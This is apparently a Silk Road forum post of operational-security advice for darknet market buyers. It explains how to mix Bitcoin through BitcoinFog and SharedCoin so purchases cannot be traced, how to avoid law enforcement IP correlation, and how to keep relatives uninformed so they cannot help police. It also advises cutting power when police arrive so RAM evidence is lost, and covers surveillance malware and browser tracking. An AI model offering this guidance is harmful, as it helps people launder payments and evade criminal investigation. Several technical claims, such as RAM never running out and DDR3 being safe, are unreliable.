BitcoinFog. When you withdraw your coins from BitcoinFog, please make sure you send them to a new wallet, and not the same wallet that you used to deposit them into BitcoinFog. Another option you can have when withdrawing the coins from BitcoinFog, is to get BitcoinFog to withdraw the coins directly to the person you want to buy something from. This takes the step of creating a new wallet and then having to forward it on and will keep things again extremely hard to track. Just keep their transaction fees in mind to make sure your desired seller is going to receive the correct amount of Bitcoins needed for the purchase or exchange. Two other options you can use are provided by Blockchain.info and can be accessed by creating a wallet and logging in to it. Send Shared and Shared Coin. Send Shared is another way of mixing up coins, the way that it works is,  you send your money into the giant pot and it gets matched up with somebody else who is sending the same amount. An example of this is let us say we have 4 people. A, B and X, Y. Person A is sending 1 Bitcoin to person B and person X is sending 1 Bitcoin to person Y. Send Shared will match these amounts together, and it will mix them so that person A sends their 1 Bitcoin to person Y and person X sends their Bitcoin to person B. This way you are breaking the chain that links person A to person B because there is no record of person A ever sending anything to person B. This is a very good option to use, and one that many people prefer. Of course, there are many people using Send Shared, so the likelihood of there just being 4 people mixing up transaction is going to be more like 10,000 or more, making it pretty much impossible to track. Shared coin uses a different method called coinjoin. Shared coin hosts a coinjoin server which acts as a meeting point for multiple people to join together in a single transaction. Having multiple people in a transaction improves privacy by making transactions more difficult to analyse. The important distinction between traditional mixing services is the server cannot confiscate or steal your coins. A sharedcoin transaction will look something like the following. https://blockchain.info/tx/e4abb15310348edc606e597effc81697bfce4b6de7598347f17c2befd4febf3b As you can see multiple inputs and outputs make the determining the actual sender and receiver more difficult. Basically it sends the coins in and out of many different wallets that are participating in Shared coin at the time and it does this to throw hundreds or thousands of transactions in all the wallets participating making it extremely difficult to track. The downside though is that coinjoin can never completely sever the link between the input and destination address, there will always be a connection between them, it is just more difficult to analyse. The benefit to Shared Coin is that while this processing is happening, you can hit cancel and get your coins back. When you send your coins into a traditional mixing service, an untrustworthy mixing service could potentially steal your coins. Now that you have the knowledge to make an educated decision on how to mix up your coins en route to your intended destination, I feel that you can now put your mind at ease when looking to buy something with Bitcoins. It should be noted that you can reverse the process if you want to cash out your Bitcoins as well. CLEARNET VS HIDDEN SERVICES â WHY YOU SHOULD BE CAREFULSome of you may have seen links to different websites on these forums. In fact my thread is full of them. As you probably know by now, a hidden service is a website that uses a .onion address and a clearnet site uses the regular internet. You must be on TOR to access the onion network, whereas clearnet sites can be accessed from any browser. So why should you be careful when visiting clearnet sites? When you see an article, link or video posted on the Silk Road forums, please note, that you should only be viewing those videos over TOR or possibly but as a last resort use a VPN and here is why. Let us use YouTube for example. YouTube is owned by Google, Google tracks everything. YouTube keeps track of which IP addresses search for what videos, and tons of meta data about itâs users. When a link to a YouTube video is posted on the SR forums, we likely have to use our regular browsers to watch it because Tor browser is not good for watching flash videos. But the problem is, if a post on SR was written on January 10, 2014 recommending a video, and this video only has 500 views, perhaps this video has been up for a few months and did not end up being very popular. And then within the few days that this article was posted, 50 people viewing the Silk Road forum watch this video. The number of views just went up in a short period of time. It is pretty easy to correlate that it is possible, that the people who watched that YouTube video, especially since it is not a popular video came from Silk Road, and if you made the mistake of using your real IP address, you have now been added to a list of people of interest. And if you do this multiple times with different YouTube videos, then they start to see a pattern and before you know it, they are confident that you are coming to watch these videos from Silk Road because every time a video is posted on Silk Road forums, your IP address comes up to watch this video. But if you use a VPN, this makes things a little harder in that they are not as easily going to be able to link the video to you yet. But once they see a VPN address constantly popping up on those videos being linked from the forums, they might submit a court order to monitor the activities of the users of the VPN. HideMyAss was one of the most well known examples of VPNs being ordered to hand over information on their users. The same thing goes with all clearnet sites. You never know who is monitoring their activity, and if it is an old article, more than a couple of years, then you can almost bet that the number of people viewing that article are down. So when somebody posts a clearnet link on the forums and people visit that link using an unprotected IP address, then the LE can start to correlate patterns against you. Of course, these articles and links are not as likely to be visited without TOR from the SR forums because you need TOR to view the forums, but especially things like YouTube videos since TOR does not work well with YouTube can be problematic. So what can you do to protect yourself? Ask yourself first, do I really need to watch that YouTube video? Is it something important that I need to see? If it is, you might consider an option that I spoke about earlier called Tortilla, but it is only available to Windows users. I talk it about it at the following article. http://silkroad5v7dywlc.onion/index.php?topic=14555.msg304569#msg304569 You will run a Virtual Machine such as Debian, but do not connect to TOR using the Virtual Machine. The VM uses a bridged apapter and routes all traffic through Tortilla which routes all traffic through TOR on your Windows host OS without having to use the TOR browser on your VM. MAC users and Linux users may just want to view the YouTube video in a one time use proxy that does not keep any logs or maybe a public wifi network that has lots of users on it daily. There is an infamous case of a murderer who called the sister of his victim from his victimâs cell phone. He would call from her Time Square in New York and taunt her and talk about how she was torturing her sister and the police put a trace on the phone. Unfortunately because Time Square is such a crowded place, even with all the cameras, they were unable to pinpoint exactly which person was making the call on that phone and they never ended up catching the guy. He ended up ditching the phone after he finally killed his victim. They knew he was a guy walking around Time Square on a cell phone but if you have ever been to Time Square, you know that there are millions of people doing the exact same thing, he just blended right in. So you may want to use a public wifi in a crowded area that has many users all day long to watch a video and keep your IP address safe. If you cannot watch videos safely without identifying yourself, then do not watch them. It is as simple as this. Yes I know it is annoying that Tor does not work well with flash videos, but it is better than being thrown in jail where you will never be able to watch any YouTube videos. The main reason I wrote this post was to remind you that correlating two users together on the internet is easier than you think. Once you start developing patterns and leaving your footprints behind, the LE have an unlimited storage space available to them to keep track of everything you do. Remember how Sabu got caught? He just logged onto IRC with his real IP address, one time. One time is all it takes for them to take you down. Always think before opening a link, what will this website identify about me? THEY ARE WATCHING YOU â VIRUSES, MALWARE, VULNERABILITIESYour computer will always be vulnerable to some sort of attack from those who want to harm you in some way. Whether it is harm your privacy, steal your information or throw you in jail. It should come to no surprise to us that the US government is actually the largest purchaser of malware.Quote     According to a new report, the United States government is now in fact the single largest buyer of malware in the world thanks to the shift to âoffensiveâ cybersecurity and is leaving us all vulnerable in the process.     In order for the government to exploit vulnerabilities discovered in major software, they cannot disclose those vulnerabilities to the manufacturers or the public, lest the exploit be fixed.     âMy job was to have 25 zero-days on a USB stick, ready to go,â one former executive at a defense contractor told Reuters. The defense contractor would purchase vulnerabilities from independent hackers and then turn them into exploits for the government to use as an offensive cyberweapon.     http://endthelie.com/2013/05/10/report-us-government-now-buys-more-malware-than-anyone-else-in-the-world/#axzz2qIjeZ32e After reviewing the sources in the article and other articles, some of these defense contractors expressed concern that the government was essentially funding criminal activity. They are paying independent hackers, in some cases blackhats to find zero day exploits (ones that have not been publicly announced yet) and buy these exploits off of them for huge sums up money, upwards of $100,000. If you are using a laptop with a built-in microphone and camera, you are extremely vulnerable to an attack as John McAffee, the man who started McAffee Anti Virus explains.Quote     âWe donât have much [security] anymore, and certainly not in the online world,â he said at Saturdayâs talk. âIf you can give me just any small amount of information about yourself, I promise you, within three days, I can turn on the camera on your computer at home and watch whatever youâre doing.â     http://abcnews.go.com/Technology/john-mcafees-product-aims-make-internet-users-virtually/story?id=20424182 So the first thing you should do right now is go grab some opaque tape and put it over your camera. If you are on a desktop and you have a webcam plugged in, unplug it unless you are using it. There is no reason to give an attacker an open window into your home. Next is your microphone, again desktops usually do not have built in microphones, but most laptops do. A microphone can be activated to listen to you talking and you need to find a way to physically disable it. The best way of course is to physically remove it, but I am not writing a tutorial on how to do that. The FBI developed a keystroke logging software called Magic Lantern. Magic Lantern can reportedly be installed remotely, via an e-mail attachment or by exploiting common operating system vulnerabilities, unlike previous keystroke logger programs used by the FBI. It has been variously described as a virus and a Trojan horse. It is not known how the program might store or communicate the recorded keystrokes.Quote        The FBI intends to deploy Magic Lantern in the form of an e-mail attachment. When the attachment is opened, it installs a trojan horse on the suspectâs computer. The trojan horse is activated when the suspect uses PGP encryption, often used to increase the security of sent e-mail messages. When activated, the trojan horse will log the PGP password, which allows the FBI to decrypt user communications.     Spokesmen for the FBI soon confirmed the existence of a program called Magic Lantern. They denied that it had been deployed, and they declined to comment further     Source: https://en.wikipedia.org/wiki/Magic_Lantern_%28software%29 Then of course we have cell phones which can be activated remotely as well.Quote     Mobile phone (cell phone) microphones can be activated remotely, without any need for physical access. This âroving bugâ feature has been used by law enforcement agencies and intelligence services to listen in on nearby conversations     https://en.wikipedia.org/wiki/Covert_listening_device#Remotely_activated_mobile_phone_microphones According to a few of the sources in the Wikipedia article, the cell phone can be activated to listen to you even when it is off. Pulling the battery will likely do the job, but there is no guarantee. So make sure the phone is not in the same room as you if you are talking about anything sensitive. As always, be super paranoid. Turn on the shower and put the phone in the bathroom if you have to, or better yet if you are going somewhere and you do not need your cell phone, leave it at home. Since most people never leave home without their cell phones, if somebody is snooping on you, they might think you are still at home. The first group of people that went to visit Snowden in Russia were told not to bring any laptops or cell phones with them for those reasons. So we know the government is actively trying to gain remote access to your computer, they can listen to your phones, what should you do about it ? You need to do the best you can to make sure the computers that you use are not exposed to the elements of risk. Always disable Javascript when visiting any websites unless the website is 100% trusted. Start phasing out the use of Microsoft Windows and MAC OSX because these closed source proprietary operating systems are not open to scrutiny and auditing the way open source Linux distributions are. There are more Windows users and thus more exploits available for Windows. Running your operating system in a Virtual Machine, even if your host OS is Linux (remember Virtual Box can run on Linux) will help cut down on the retention of any malware you might pick up when on the internet. Do not go to any potentially harmful sites on your freedom fighting computers. Do not open any emails from anyone that you do not trust 100%. Regularly format your hard drives to keep them clean of any hidden viruses. If you are unsure if something is safe, test it on a computer only meant for testing and one that is not connected to the internet. If you can reset your boot sector on your hard drive from time to time that would be a good idea as well, because you can get master boot sector viruses that would boot up a virus before your computer even boots into the OS. Flash your BIOS, the BIOS is the first thing that runs when you turn on your computer, if you have a virus in your BIOS, there is no antivirus that can remove it, you would need to flash your BIOS and install a new firmware. Make sure the firmware is 100% trustworthy as infected firmware is the most common way to get a BIOS virus. In the interest of saving space I will not go into detail on how to do all of these virus removals because there are numerous tutorials online and I am certainly not an expert in this field. I am sure there are many other things I have not covered in this post and if somebody else wants to chime in, please feel free to do so as long as you can provide sources for the claims you are making. I do not want to turn this thread into a bunch of unsubstantiated claims and paranoid conspiracy theories. But if you have something valuable to add to this, I am open to your input. MONITORING YOU WITH AN ANTENNAFirst thing I want you to do is find a secure way of watching this video. Remember they log everyone who watches these videos and since I am linking you to them from Silk Road, they will be watched even closer. This video shows how using a strong antenna, sitting in a van outside your home, the FBI could be picking up on your keystrokes on a wired keyboard. In fact many people speculate that the new smart meters installed in many homes already have this technology to determine everything you are doing in your home electronically. Wired and wireless keyboards emit electromagnetic waves, because they contain electronic components. This electromagnetic radiation could reveal sensitive information such as keystrokes as shown in the video. Every electrmagnetic wave is unique to the device using it, which gives a person spying on you the ability to tell the difference between you using your computer versus the dishwasher. According to the people who did this experiment, they were able to extend the range up to 20 meters using relatively cheap technology. This was for wired keyboards by the way, and they go on to explain that wireless keyboards and mouses are even easier. Which brings us to another area of interest, wireless transmissions. Things like wireless keyboards and wireless mice (or mouses?) are vulnerable to eavesdropping as well. If they are not using a strong enough encryption to send data to the receiver, anyone can be listening in on your keystrokes and mouse activity. Probably something most people never thought about either, this is on top of the electromagnetic waves that can also be picked up.Quote     Microsoft has upgraded the weak encryption found on todayâs mass-market wireless keyboards with a new design that uses 128-bit AES to secure communication to and from the PC.     Hitherto, keyboard encryption has been weak, with keys chosen from a small palette of possibilities, with one hacking group claiming in 2009 that it had developed a tool specifically to sniff keystrokes from Microsoft keyboards at a range up to a 10 metres.     http://news.techworld.com/security/3284218/new-microsoft-wireless-keyboard-gets-128-bit-encryption/ Are you using wireless technology? How old is it? Might be time to upgrade your equipment. 10 meters is about 33 feet, but remember the technology available to the government could potentially reach beyond that. Then there are other things people forget such as wireless monitors which broadcast your screen to a receiver that can be picked up. Just think about the old antennas people used to have on top of their homes, and how far away those could pick up signals from TV stations, if you had one of those pointed at you in a van across the street, there is no doubt they could be eavesdropping on your activities inside. One researcher was able to use a wireless signal sent by a smart meter from up to 300 meters away (900 feet) to find out which house it was coming from and what the current power consumption was in plain text. She was then able to use this information to determine when people were and were not home based on average spikes in consumption since the meters pulse every 30 seconds.Quote     The data sent was in plain text and carried the identification number of the meter and its reading. The name of the home owner or the address arenât included, but anyone motivated enough could quickly figure out the source.     âThe meter ID was printed on the front of the meter we looked at, so theoretically you could read the ID [off a target meter] and try to sniff packets,â Xu said.     In her tests, Xu found she was able to pull packets out of the air from target meters between once every 2 to 10 minutes. Thatâs fast enough to be able to work out the average power consumption of a house and notice start to deduce when someone is at home.     https://www.networkworld.com/news/2012/110512-smart-meters-not-so-clever-263977.html Things like automatic timers that flip switches might be worth investing in to always make it look like someone is home until security researchers start looking into ways to avoid the wide open door we are giving to anyone who wants to find data about us. What can you do about these types of eavesdropping? Not a whole lot unless you want to start turning into a tin-foil hat type of person. There are some fun things you can do if you want to go crazy with it though as recommended by the following site. http://www.lessemf.com/smart.htmlQuote     Y-SHIELD     YShield High Frequency Shielding Paint     Easy to apply water-based paint for walls, ceilings, doors and other interior OR exterior surfaces.

It is completely up to you what you want to do, I am just giving you the options and the education so you can make an educated decision of how far you want to go to protect your privacy. COOKIES & JAVASCRIPT REVISITED, PLUS FLASH COOKIES AND OTHER BROWSER TRACKINGYour browser can reveal an alarming amount of information about you. Surprisingly enough, or not too surprising, when you visit a website there is a surprisingly large amount of identifying data being sent to the website you are communicating with. Cookies Cookies are pieces of information that a web site can send to your browser. If your browser âacceptsâ them, they will be sent back to the site every time the browser accepts a page, image or script from the site. A cookie set by the page/site youâre visiting is a âsecond partyâ cookie. A cookie set by another site thatâs just providing an image or script (an advertiser, for instance), is called a âthird partyâ cookie. Cookies are the most common mechanisms used to record the fact that a particular visitor has logged in to an account on a site, and to track the state of a multi-step transaction such as a reservation or shopping cart purchase. As a result, it is not possible to block all cookies without losing the ability to log into many sites and perform transactions with others. Unfortunately, cookies are also used for other purposes that are less clearly in usersâ interests, such as recording their usage of a site over a long period of time, or even tracking and correlating their visits to many separate sites (via cookies associated with advertisements, for instance). With recent browsers, the cookie setting that offers users the most pragmatic tradeoff between cookie-dependent functionality and privacy is to only allow cookies to persist until the user quits the browser (also known as only allowing âsession cookiesâ). Tails does this automatically by the way with Iceweasel. Recent Cookie-Like âFeaturesâ in Web Browsers In addition to the regular cookies that web browsers send and receive, and which users have begun to be aware of and manage for privacy, companies have continued to implement new âfeaturesâ which behave like cookies but which are not managed in the same way. Adobe has created âLocal Stored Objectsâ (also known as âFlash Cookiesâ) as a part of its Flash plug-ins; Mozilla has incorporated a feature called âDOM storageâ in recent versions of Firefox. Web sites could use either or both of these in addition to cookies to track visitors. It is recommended that users take steps to prevent this. Managing Mozilla/Firefox DOM Storage Privacy. If you use a Mozilla browser, you can disable DOM Storage pseudo-cookies by typing about:config into the URL bar. That will bring up an extensive list of internal browser configuration options. Type âstorageâ into the filter box, and press return. You should see an option called dom.storage.enabled. Change it to âfalseâ by right-clicking and choosing Toggle. Managing Adobe Flash Privacy. Adobe lists advice on how to disable Flash cookies on their website.http://helpx.adobe.com/flash-player/kb/disable-local-shared-objects-flash.html. There are some problems with the options Adobe offers (for instance, there is no âsession onlyâ option), so it is probably best to globally set Local Stored Object space to 0 and only change that for sites which you are willing to have tracking you. On the Linux version of Adobeâs Flash plugin there does not seem to be a way set the limit to 0 for all sites and therefore its use should be limited or avoided. Luckily Tails does not have flash installed, but in case you are not using Tails be aware of this. If you absolutely need to watch a video online, find a way to download the video to your computer and watch it that way. This takes the browser out of the loop of processing a video for you and eliminates those Flash cookies which help identify you. Javascript Javascript is probably the grand daddy of all vulnerabilities in internet browsing. The majority of exploits, malware, viruses and other computer take overs happen because of Javascript code executing in your browser. Javascript has many uses. Sometimes it is simply used to make webpages look flashier by having them respond as the mouse moves around or change themselves continually. In other cases, javascript adds significantly to a pageâs functionality, allowing it to respond to user interactions without the need to click on a âsubmitâ button and wait for the web server to send back a new page in response. Unfortunately, javascript also contributes to many security and privacy problems with the web. If a malicious party can find a way to have their javascript included in a page, they can use it for all kinds of evil: making links change as the user clicks them; sending usernames and passwords to the wrong places; reporting lots of information about the users browser back to a site. Javascript is frequently a part of schemes to track people across the web, or worse, to install malware on peopleâs computers. It is best to disable Javascript (about:config in URL bar search for Javascript and Toggle it to disabled) unless you absolutely trust the site or use the browser add-on NoScripts that comes with Tails and is available in Firefox to at least selectively block malicious scripts. Disabling Javascript outright is the best option though, and gumby has added a suggestion that can make it even easier to do this.Quote from: gumby on January 14, 2014, 08:59:57 pm     Supposedly NoScript doesnât block all Javascript even when it is enabled and no sites are on the whitelist. Not sure about that claim but Iâve seen people make it. Thereâs a Firefox add-on (which also works in Tor Browser) called toggle_js which lets you toggle the about:config javascript.enable parameter through a toolbar icon so you donât have to go into about:config. I find it quite useful. Javascript can also reveal an alarming amount of information about you even if you are using TOR or a VPN, including your browser plug-ins, your time zone, what fonts you have installed (flash does this as well) and of course most browsers will send your user agent, meaning they tell the website what browser you are using and in some cases your operating system! Some of these details may not seem very important, but collected as a whole, it can make it easier to identify who you are online by almost generating a finger print of you with your specific settings related to your browser. Then as you hop around from site to site with your finger print, correlations and patterns can be drawn from this and eventually linked to you if you are not extremely careful. Luckily, Tails and Whonix overrides the majority of this identifying information, so as long as you use Tails with Javascript disabled, or at the very least with NoScripts (Flash is disabled automatically) then you can cut down on the amount of information you share. Needless to say, it is not always possible to browse with Tails, so these are things you need to be aware of when you are browsing with regular browsers on your native OS with your browser of choice. See what your browser is revealing about you at this page below. Do not visit it from your real IP address, since this page will be linked to the Silk Road forums from the moment I make this post part of my thread. As a result, you may wish to search online for other sites that check what information your browser is revealing about you. If you are confident in your OpSec abilities, use the one below. http://browserspy.dk/ A FEW RECOMMENDATIONS Here are a few recommendations that may slip by the average user on these forums. 1. Never leave your computer that you use for your freedom fighting unattended.This may seem like a no-brainer, but if you have kids, or a spouse or a sibling that does not understand what you do on the computer and they decide to hop on your account and sign into their email, Facebook or doing things that could compromise your location while on that computer because they simply did not know, this could potentially cause you problems. Maybe you are connecting through multiple layers like this TOR -> VPN(1) -> TOR -> VPN(2), so that is 4 layers and VPN(2) is the IP address that everyone sees. Then your child or spouse goes on to their email with that IP address, then signs off without your knowledge. That VPN is now linked to you. And we remember how when under pressure, companies will likely give out information about their customers to avoid fines, shut downs and prosecution. 2. Do not tell your family members what you are doing, just instruct them not to touch your computer. Keep it passworded. â You should never tell anyone what you are doing on your computer because if law enforcement ever did show up, they would question your family and friends about you. If they honestly do not know, then they cannot be held in contempt of court, so it is better to keep them in the dark. Or maybe the police might scare them into giving up all your secrets because they tell your family that if they do not confess that yourself and them will be going to jail, possibly for a long time. Just password your computer and never leave it unattended with the screen unlocked. 3. If you use multiple layers to connect, make sure you regularly check to make sure all your layers are in tact. VPNs can drop sometimes without warning and while you should never set yourself up so that if one layer drops you lose everything, just keep in mind when one drops that you may need to adjust the way you handle yourself online until you get that next layer up. This is one of the reaons I like Tortilla so much, if my TOR layer does not work, it does not bypass it and go to my next layer, instead it just stops working altogether. When VPNs drop, your computer bypasses the dropped VPN and moves onto the next layer, which in some cases could be your real IP address. Just something to keep in mind. 4. Do not use the same password for multiple forums, marketplaces, emails and so forth. â Expect that one or more of the websites you are registered with is storing your password in plain text. This means that if somebody finds an exploit in the software and is able to dump the entire database, they can find your password. And if you used the same password for other sites, and god forbid with the same username as well, your entire list of accounts is compromised. Always use different passwords and keep them strong. Do not let anything about your password identify how you choose passwords, or identify anything personal about you. COLD BOOT ATTACKS, UNENCRYPTED RAM EXTRACTION Did you know that even if your system is whole disk encrypted, your data can still be extracted using something called a cold boot attack? Read on. The first thing we need to talk about is RAM. RAM stands for random access memory. All you need to know about RAM is that RAM is the place in a computer where the operating system, application programs, and data in current use are kept so that they can be quickly reached by the computerâs processor. RAM is much faster to read from and write to than the other kinds of storage in a computer, the hard disk, floppy disk, and CD-ROM. However, the data in RAM stays there only as long as your computer is running. When you turn the computer off, RAM loses its data. When you turn your computer on again, your operating system and other files are once again loaded into RAM, usually from your hard disk. RAM can be compared to a personâs short-term memory and the hard disk to the long-term memory. The short-term memory focuses on work at hand, but can only keep so many facts in view at one time. If short-term memory fills up, your brain sometimes is able to refresh it from facts stored in long-term memory. A computer also works this way. If RAM fills up, the processor needs to continually go to the hard disk to overlay old data in RAM with new, slowing down the computerâs operation. Unlike the hard disk which can become completely full of data, RAM never runs out of memory. Data can be extracted from the RAM using various tools. When you have a text document open and you are working on it, you are working from the RAM. Meaning that if you are working on a sensitive document, that document is temporarily stored in the RAM and is vulnerable to being extracted while the computer is on. When RAM is being stored, it is being stored without any form of encryption, making it very easy to steal and a huge security risk. Shutting down a computer through its normal shutdown cycle usually goes through a process of clearing the RAM. However, if the computer loses power abruptly like in a power outage, the computer does not go through its normal shut down cycle and some information remains on the RAM chips for a few seconds up to a few minutes. This is one of the ways cold boot attacks can work. I also want to quickly introduce a type of RAM to you which will help you understand the rest of this article better. Below is a research paper and they used a type of ram called DRAM. DRAM stands for dynamic random access memory. DRAM is the most common kind of random access memory (RAM) for personal computers and workstations. DRAM is dynamic in that, unlike static RAM (SRAM), it needs to have its storage cells refreshed or given a new electronic charge every few milliseconds. DRAM is designed to lose its memory quickly after losing power. Then there are subsections of DRAM called DDR. This is a way of making the memory more quickly available, but it is not really important to fully understand. Wikipedia can give you all you need to know about DDR. In this article we are focusing on just the concept of DDR, DDR2 and DDR3. These are newer versions of DRAM that keep getting better, and I believe we are currently up to DDR4. But most computers circulating around today have DDR2 and DDR3 in them unless they are older computers, this includes laptops. DRAM is known as a type of volatile memory, it is computer memory that requires power to maintain the stored information. It retains its contents while powered, but when power is interrupted, stored data is quickly lost. But how quickly is it lost? In 2008, a group of researchers wanted to see the practicality of extracting unencrypted data from the RAM in your computer. They argued that DRAMs used in most modern computers retain their contents for seconds to minutes after power is lost, even at operating temperatures and even if removed from a motherboard. And by using an analysis tool they were able to search for key files (such as PGP keys) held in the RAM that could be used to decrypt encrypted volumes (drives) on your computer. They successfully were able to decrypt volumes using BitLocker, FileVault, dm-crypt, and TrueCrypt. Below is the abstract of their research.Quote     Lest We Remember: Cold Boot Attacks on Encryption Keys     Abstract Contrary to popular assumption, DRAMs used in most modern computers retain their contents for seconds to minutes after power is lost, even at operating temperatures and even if removed from a motherboard. Although DRAMs become less reliable when they are not refreshed, they are not immediately erased, and their contents persist sufficiently for malicious (or forensic) acquisition of usable full-system memory images. We show that this phenomenon limits the ability of an operating system to protect cryptographic key material from an attacker with physical access. We use cold reboots to mount attacks on popular disk encryption systems â BitLocker, FileVault, dm-crypt, and TrueCrypt â using no special devices or materials. We experimentally characterize the extent and predictability of memory remanence and report that remanence times can be increased dramatically with simple techniques. We offer new algorithms for finding cryptographic keys in memory images and for correcting errors caused by bit decay. Though we discuss several strategies for partially mitigating these risks, we know of no simple remedy that would eliminate them.     https://citp.princeton.edu/research/memory/ [Abstract] http://citpsite.s3-website-us-east-1.amazonaws.com/oldsite-htdocs/pub/coldboot.pdf [Full Text] Here is an FLV video you can download to watch exactly how they did it. https://anonfiles.com/file/97b5737dba6b96871fd862b8a587b8f0 This was very troubling to most people, and had many people freaking out when the research paper was released back in 2008 because even tough encryption tools like TrueCrypt could be rendered useless with an attack like this. Upon further analysis of the paper, I wanted to note that they used SDRAM, DDR and DDR2, and not DDR3 because it was not available at that time. This prompted TrueCrypt to release the following statement on their website.Quote     Unencrypted Data in RAM     It is important to note that TrueCrypt is disk encryption software, which encrypts only disks, not RAM (memory).     Keep in mind that most programs do not clear the memory area (buffers) in which they store unencrypted (portions of) files they load from a TrueCrypt volume. This means that after you exit such a program, unencrypted data it worked with may remain in memory (RAM) until the computer is turned off (and, according to some researchers, even for some time after the power is turned off*). Also note that if you open a file stored on a TrueCrypt volume, for example, in a text editor and then force dismount on the TrueCrypt volume, then the file will remain unencrypted in the area of memory (RAM) used by (allocated to) the text editor. This applies to forced auto-dismount too.     Inherently, unencrypted master keys have to be stored in RAM too. When a non-system TrueCrypt volume is dismounted, TrueCrypt erases its master keys (stored in RAM). When the computer is cleanly restarted (or cleanly shut down), all non-system TrueCrypt volumes are automatically dismounted and, thus, all master keys stored in RAM are erased by the TrueCrypt driver (except master keys for system partitions/drives â see below). However, when power supply is abruptly interrupted, when the computer is reset (not cleanly restarted), or when the system crashes, TrueCrypt naturally stops running and therefore cannot erase any keys or any other sensitive data. Furthermore, as Microsoft does not provide any appropriate API for handling hibernation and shutdown, master keys used for system encryption cannot be reliably (and are not) erased from RAM when the computer hibernates, is shut down or restarted.**     To summarize, TrueCrypt cannot and does not ensure that RAM contains no sensitive data (e.g. passwords, master keys, or decrypted data). Therefore, after each session in which you work with a TrueCrypt volume or in which an encrypted operating system is running, you must shut down (or, if the hibernation file is encrypted, hibernate) the computer and then leave it powered off for at least several minutes (the longer, the better) before turning it on again. This is required to clear the RAM.     * Allegedly, for 1.5-35 seconds under normal operating temperatures (26-44 Â°C) and up to several hours when the memory modules are cooled (when the computer is running) to very low temperatures (e.g. -50 Â°C). New types of memory modules allegedly exhibit a much shorter decay time (e.g. 1.5-2.5 seconds) than older types (as of 2008).    ** Before a key can be erased from RAM, the corresponding TrueCrypt volume must be dismounted. For non-system volumes, this does not cause any problems. However, as Microsoft currently does not provide any appropriate API for handling the final phase of the system shutdown process, paging files located on encrypted system volumes that are dismounted during the system shutdown process may still contain valid swapped-out memory pages (including portions of Windows system files). This could cause âblue screenâ errors. Therefore, to prevent âblue screenâ errors, TrueCrypt does not dismount encrypted system volumes and consequently cannot clear the master keys of the system volumes when the system is shut down or restarted.     http://www.truecrypt.org/docs/unencrypted-data-in-ram A few key points to extract from here are that properly shutting down your computer reduces, if not completely enliminates this risk except in the case of encrypted system disks. What is meant by this is, for example, if your main operating system is Windows and you have encrypted that drive, this is your system drive and the master key for that drive is not cleared upon shutdown or restart. The solution is simply to never store anything sensitive on your system volume. Whether you use a partitioned drive or a USB stick that is encrypted, just make sure that your main drive that is booted into does not contain sensitive data. And if you have no other choice, then you need to separately encrypt the data inside the system volume with a different passphrase and private key so that even if they get into your system volume, they cannot access the other encrypted data you want to protect. They can use these same techniques to sniff around for your PGP private key files in the RAM, so this is a very real threat in the case that if your computer is still powered on if they come to get you, they can use these techniques to retrieve data from your computer. However, there is a debate about whether or not this type of attack can persist even now into 2014 with newer types of RAM. I point to a random blog online and I make no judgement as to whether or not this is a legitimate claim, but it is interesting nonetheless.Quote     Now to test the actual cold-boot attack. Fill memory with around 1000 taint markers, just to be sure there are enough.     Now shut down. Ostensibly, the markers could be recognizable in RAM after whole minutes, but Iâm impatient, so I just waited 10 seconds for the first test. Boot up, into the minimal linux installation. Load the kernel module: insmod ./rmem.ko. Run hunter.     Nothing.     Thatâs ok, though. There should be at least some data corruption. The default marker size is 128 bytes, so letâs set the hamming distance to 128, meaning that one bit out of every byte is allowed to be flipped. (Statistically, thatâs equivalent to a 25% corruption rate, since a corrupted bit has a 50% chance of remaining the same).     Nothing.     Looks like in 10 seconds, memory was completely corrupted. Letâs try a shorter interval: 2 seconds. Same results. Nothing is left of our âencryption keyâ.     http://bytbox.net/blog/2013/01/cold-boot-attacks-overrated.html The user claimed to be using a newer type of RAM called DDR3. which is known to hold memory for a much shorter time than DDR2. And a newer research paper released in September 2013 tried to reproduce the findings of the 2008 research but using computers with DDR1, DDR2 and DDR3 and their findings were interesting.Quote     Even though a target machine uses full disk encryption, cold boot attacks can retrieve unencrypted data from RAM. Cold boot attacks are based on the remanence effect of RAM which says that memory contents do not disappear immediately after power is cut, but that they fade gradually over time. This effect can be exploited by rebooting a running machine, or by transplanting its RAM chips into an analysis machine that reads out what is left in memory. In theory, this kind of attack is known since the 1990s. However, only in 2008, Halderman et al. have shown that cold boot attacks can be well deployed in practical scenarios. In the work in hand, we investigate the practicability of cold boot attacks. We verify the claims by Halderman et al. independently in a systematic fashion. For DDR1 and DDR2, we provide results from our experimental measurements that in large part agree with the original results. However, we also point out that we could not reproduce cold boot attacks against modern DDR3 chips. Our test set comprises 17 systems and system configurations, from which 5 are based on DDR3.     https://ieeexplore.ieee.org/xpl/login.jsp?tp=&arnumber=6657268&url=http%3A%2F%2Fieeexplore.ieee.org%2Fxpls%2Fabs_all.jsp%3Farnumber%3D6657268 So what does should you do? Number one, always shut down your computer when you are not around it or put it into hibernation mode, otherwise your sensitive documents could be lingering around in your RAM. Simply locking the screen will do you no good. Make sure your computer is using a DDR3 type of RAM, if possible. Some of you this means you need to upgrade. If you are unsure what kind of RAM your computer has, search online to find a tool that will detect it for you. Never store anything sensitive on an encrypted system volume, because this attack can be used to break into the volume and anything unencrypted can be retrieved. If you are using a laptop, pull the battery out so that if you need to quickly pull the power, it will turn it off immediately. If you have time, shut down the computer, otherwise turn it off immediately so that it is not running. The more time you can waste are precious seconds where they cannot retrieve any data. So immediately shut things off if you do not have enough time to do a proper shutdown. Consider putting a lock on your computer case, and if you want to go take it a step further, bolt it to the floor. That way the amount of time it would take them to get inside your computer would waste valuable minutes and more than likely render any recoverable memory useless. Some people have even suggested that you solder the RAM into the motherboard so they cannot take it out. This may help slow things down, but remember that cooling the memory down can preserve things for quite a while if you are using DDR1 or DDR2. With DDR3, you should be good to go and I believe with this realization, manufacturers will likely start looking at ways to encrypt RAM, but until that time you do need to be aware of this as a possible means for stealing your sensitive data and something you should keep in the back of your mind and prepare yourself for just in case. THE STRENGH OF CRYPTOGRAPHY AND ANONYMITY WHEN USED PROPERLYThis post is meant to serve as an example of how, when cryptography and anonymity is used properly, you can evade just about anybody including the police. By now, everyone has likely heard of someone getting locked out of their computer and being forced to pay by the attacker to have it unlocked, this is CryptoLocker. Dell SecureWorks estimates that CryptoLocker has infected 250,000 victims. The average payout is $300 each, and millions in laundered Bitcoin have been tracked and traced to the ransomwareâs money runners. CryptoLocker is a ransomware trojan which targets computers running Microsoft Windows[1] and first surfaced in September 2013. A CryptoLocker attack may come from various sources; one such is disguised as a legitimate email attachment. A ZIP file attached to an email message contains an executable file with the filename and the icon disguised as a PDF file, taking advantage of 